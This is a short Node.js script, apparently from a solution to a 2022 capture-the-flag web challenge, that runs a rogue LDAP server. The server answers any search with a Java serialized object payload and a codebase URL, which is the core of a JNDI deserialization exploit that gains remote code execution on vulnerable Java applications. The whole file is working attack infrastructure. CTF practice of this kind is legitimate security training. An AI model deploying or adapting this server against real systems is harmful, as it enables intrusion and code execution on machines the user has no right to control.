const ldap = require('ldapjs')
const fs = require('fs')
const server = ldap.createServer()


server.search('', (req, res) => {

    res.send({
        dn: '',
        attributes: {
            javaSerializedData: fs.readFileSync('D:\\CTFs\\CyberApocalypseCTF2022\\web_checkpointbots\\solve\\serialized.object'),
            javaClassName: 'foo',
            javaCodeBase: ['http://127.0.0.1:1389']

        }
    });
    res.end();
});

server.listen(1389, '127.0.0.1', () => {
    console.log(`[+] LDAP Server reachable on :  ${server.url} `)
});